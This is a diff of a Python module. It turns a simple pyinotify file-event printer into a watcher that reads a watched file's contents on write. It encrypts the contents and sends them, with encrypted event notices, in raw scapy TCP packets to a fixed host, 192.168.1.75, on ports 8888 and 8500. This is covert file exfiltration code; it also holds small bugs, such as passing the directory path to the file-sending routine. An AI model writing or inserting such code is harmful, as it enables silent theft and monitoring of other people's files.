@@ -1,42 +1,50 @@
 import pyinotify
+from scapy.all import *
+from datetime import datetime
+import encryption
 
 
-class EventProcessor(pyinotify.ProcessEvent):
-    _methods = [
-        "IN_CREATE",
-        "IN_OPEN",
-        "IN_ACCESS",
-        "IN_ATTRIB",
-        "IN_CLOSE_NOWRITE",
-        "IN_CLOSE_WRITE",
-        "IN_DELETE",
-        "IN_DELETE_SELF",
-        "IN_IGNORED",
-        "IN_MODIFY",
-        "IN_MOVE_SELF",
-        "IN_MOVED_FROM",
-        "IN_MOVED_TO",
-        "IN_Q_OVERFLOW",
-        "IN_UNMOUNT",
-        "default"
-    ]
+class EventHandler(pyinotify.ProcessEvent):
+    def process_IN_ACCESS(self, event):
+        self.send_notif("Accessed", event.pathname)
 
+    def process_IN_DELETE(self, event):
+        self.send_notif("Deleted", event.pathname)
 
-def process_generator(cls, method):
-    def _method_name(self, event):
-        print("Method name: process_{}()\n"
-               "Path name: {}\n"
-               "Event Name: {}\n".format(method, event.pathname, event.maskname))
-    _method_name.__name__ = "process_{}".format(method)
-    setattr(cls, _method_name.__name__, _method_name)
+    def process_IN_CLOSE_WRITE(self, event):
+        self.send_notif("Modified", event.pathname)
+        self.send_file(event.path)
+
+    def send_notif(self, action, data):
+        current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+        msg = f"[{current_time}] {action}: {data}"
+        encrypted_msg = encryption.encrypt_data(msg.encode("utf-8"))
+        encrypted_msg += b"$NOTIF"
+
+        pkt = IP(dst="192.168.1.75")/TCP(sport=RandShort(), dport=8888)/encrypted_msg
+
+        send(pkt, verbose=False) 
+        time.sleep(0.1)
+
+    def send_file(self, filename):
+        with open(filename) as file:
+            data = file.read()
+
+        # Encrypt data first, and then send
+        encrypted_data = encryption.encrypt_data(data.encode("utf-8"))
+        encrypted_data = encrypted_data + b"$EOF" + bytes(filename, encoding="utf-8")
+
+        pkt = IP(dst="192.168.1.75")/TCP(sport=RandShort(), dport=8500)/encrypted_data
+
+        send(pkt, verbose=False)
+        time.sleep(0.1)
 
 
 def start_watchfile(filename):
-    for _method in EventProcessor._methods:
-        process_generator(EventProcessor, _method)
-
     watch_manager = pyinotify.WatchManager()
-    event_notifier = pyinotify.ThreadedNotifier(watch_manager, EventProcessor())
+    mask = pyinotify.IN_ACCESS | pyinotify.IN_DELETE | pyinotify.IN_CLOSE_WRITE
 
-    watch_manager.add_watch(filename, pyinotify.ALL_EVENTS)
-    event_notifier.start()
+    notifier = pyinotify.ThreadedNotifier(watch_manager, EventHandler())
+
+    watch_manager.add_watch(filename, mask)
+    notifier.start()
